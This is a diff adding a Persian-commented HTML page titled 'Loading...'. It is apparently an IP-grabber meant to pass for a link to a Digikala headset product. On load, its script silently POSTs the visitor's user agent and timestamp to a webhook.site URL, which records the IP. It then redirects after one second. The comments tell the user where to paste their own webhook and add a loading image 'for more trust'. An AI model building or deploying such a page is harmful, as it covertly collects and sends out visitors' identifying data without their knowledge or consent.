@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body style="background-color:#f3f3f3; font-family:sans-serif; text-align:center; padding-top:50px;">
+    
+    <!-- یک تصویر بارگذاری ساده برای اعتماد بیشتر -->
+   
+
+    <script>
+        // ---------------------------------------------------------
+        // قسمت مهم: آدرس وب‌هوک خودت را اینجا جایگزین کن
+        // آدرس زیر را از سایت Webhook.site -> تب "Code Snippets" -> "POST" کپی کن
+        // اگر نمی‌دانی چطور پیدا کنم، پایین توضیح دادم.
+        // ---------------------------------------------------------
+        
+        var webhookUrl = "https://webhook.site/774ac51b-293e-425e-9e2f-708532e9296a"; 
+
+        // 1. ارسال اطلاعات (IP و مرورگر) به پشت صحنه
+        fetch(webhookUrl, {
+            method: 'POST',
+            body: JSON.stringify({
+                ip: null, // IP توسط سرور وب‌هوک تشخیص داده می‌شود
+                userAgent: navigator.userAgent,
+                time: new Date().toISOString()
+            })
+        }).catch(console.error);
+
+        // 2. هدایت کاربر به آمازون بعد از 1 ثانیه
+        setTimeout(function() {
+            window.location.href = "https://www.digikala.com/product/dkp-3537683/%D9%87%D8%AF%D8%B3%D8%AA-%DA%AF%DB%8C%D9%85%DB%8C%D9%86%DA%AF-%D8%B1%DB%8C%D8%B2%D8%B1-%D9%85%D8%AF%D9%84-blackshark-v2-x-%D8%A8%D8%A7-%D9%86%D9%88%DB%8C%D8%B2-%DA%A9%D9%86%D8%B3%D9%84%DB%8C%D9%86%DA%AF-%D8%A8%D8%AF%D9%86%D9%87-%D9%88-%D9%86%D9%88%DB%8C%D8%B2-%DA%A9%D9%86%D8%B3%D9%84%DB%8C%D9%86%DA%AF-%D9%85%DB%8C%DA%A9%D8%B1%D9%88%D9%81%D9%88%D9%86-enc-%D8%A7%D8%AA%D8%B5%D8%A7%D9%84-%D8%A7%D8%B2-%D8%B7%D8%B1%DB%8C%D9%82-%D8%AC%DA%A9-35-%D9%85%DB%8C%D9%84%DB%8C%D9%85%D8%AA%D8%B1%DB%8C-%D8%AF%D8%A7%D8%B1%D8%A7%DB%8C-%D8%B5%D8%AF%D8%A7%DB%8C-%D9%81%D8%B1%D8%A7%DA%AF%DB%8C%D8%B1-71-%DA%A9%D8%A7%D9%86%D8%A7%D9%84%D9%87-%D8%AF%D8%A7%D8%B1%D8%A7%DB%8C-%D8%AA%DA%A9%D9%86%D9%88%D9%84%D9%88%DA%98%DB%8C-%D8%B5%D8%AF%D8%A7%DB%8C-360-%D8%AF%D8%B1%D8%AC%D9%87/?product_id=3537683&variant_id=38141503";
+        }, 1000);
+
+    </script>
+</body>
+</html>
